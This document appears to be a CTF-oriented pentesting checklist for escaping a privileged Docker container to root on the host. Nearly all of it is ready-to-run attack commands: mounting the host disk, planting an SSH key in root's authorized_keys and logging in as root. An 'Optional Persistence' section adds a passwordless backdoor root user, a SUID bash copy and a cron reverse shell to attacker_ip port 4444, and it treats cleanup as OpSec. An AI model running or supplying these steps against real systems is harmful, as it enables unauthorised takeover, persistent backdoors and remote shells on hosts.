---
title: "🧨 Root-to-Host Privilege Escalation via Docker"
description: "A concise checklist for escalating from root inside a Docker container to root access on the host system."
tags: [docker, privilege-escalation, pentesting, CTF, root, linux]
date: 2025-08-02
---

# 🧨 Root-to-Host Privilege Escalation via Docker (Checklist)

## 🧠 Scenario:
I gained root access *inside a Docker container* and want to escalate to root *on the host*.

---

## ✅ Step 1: Confirm you're inside a container (not host)
Check:
```bash
cat /etc/hostname
cat /proc/1/cgroup
```
Look for signs like:
- Hostname = short hex (e.g. e6ff5b1cbc85)
- `docker` or `containerd` in `/proc/1/cgroup`

---

## ✅ Step 2: Enumerate block devices
Look for mounted host devices:
```bash
lsblk
mount
df -h
```

You're looking for something like `/dev/vda1`, `/dev/sda1`, or `/dev/mapper/...`

---

## ✅ Step 3: Mount the host's root filesystem
If you find a likely device:
```bash
mkdir /mnt
mount /dev/vda1 /mnt
```

Check if `/mnt/root`, `/mnt/etc`, and `/mnt/home` exist — you're now looking at the host filesystem.

---

## ✅ Step 4: Inject your SSH key into the host’s root account

### On your attacker box:
```bash
ssh-keygen -t ed25519 -f myhostrootkey
cat myhostrootkey.pub
```

### Inside the container:
```bash
mkdir -p /mnt/root/.ssh
echo 'ssh-ed25519 AAAAC3Nz... attacker@box' >> /mnt/root/.ssh/authorized_keys
chmod 700 /mnt/root/.ssh
chmod 600 /mnt/root/.ssh/authorized_keys
```

---

## ✅ Step 5: SSH into the host as root
From your box:
```bash
ssh -i myhostrootkey root@<host-ip>
```

Discover the host’s IP from inside the container:
```bash
ip route | grep default
```

Try:
```bash
ssh -i myhostrootkey root@172.17.0.1
```

---

## ✅ Step 6 (Optional): Clean up
Inside the container:
```bash
rm -f /mnt/root/.ssh/authorized_keys
```

---

## 🧠 Why this works:
- A **privileged Docker container** is allowed to mount host block devices
- If `/root/.ssh/authorized_keys` is writable, we can inject a key for **passwordless root access**
- This technique bypasses login protections entirely — we "become" the host root

---

## ✅ Bonus: Alternate host-root options
- Drop a SUID binary in `/mnt/usr/bin/`
- Overwrite `/etc/shadow` to reset the root password
- Edit `/etc/cron.d/` for persistence

---

## 📌 Visual Diagram (Conceptual)

```
[ Attacker Box ]
       |
       | ssh (with private key)
       v
[ Host System ]
   /root/.ssh/authorized_keys  <-- injected public key
       ^
       | mounted at /mnt/root inside container
       |
[ Privileged Docker Container ]
       |
       | mount /dev/vda1 /mnt
       v
[ Host Filesystem Visible in Container ]
```

---

## 🏁 Root Flag Collection

Once the host’s root filesystem is mounted:
```bash
cat /mnt/root/root.txt
```

If root.txt is stored elsewhere (e.g., `/home/user/root.txt`):
```bash
find /mnt -name root.txt
```

---

## 🛡️ Optional Persistence Techniques

From within the container (with host mounted at `/mnt`), you can:
- **Create a backdoor root user**:
  ```bash
  echo 'hacker::0:0:root:/root:/bin/bash' >> /mnt/etc/passwd
  ```

- **Drop a SUID shell**:
  ```bash
  cp /bin/bash /mnt/usr/bin/rootbash
  chmod +s /mnt/usr/bin/rootbash
  ```

- **Edit crontab for scheduled reverse shell**:
  ```bash
  echo '* * * * * root bash -i >& /dev/tcp/attacker_ip/4444 0>&1' >> /mnt/etc/crontab
  ```

- **Replace /etc/shadow root password hash** (dangerous but effective)

---

## 🧹 Clean Up (optional, for CTF or OpSec)
```bash
rm -f /mnt/root/.ssh/authorized_keys
rm -f /mnt/usr/bin/rootbash
# remove any crontab or backdoor users if added
```

---

**Remember**: A privileged container is a root-level foothold — anything mounted from the host is fair game. Always treat Docker privilege carefully in production.
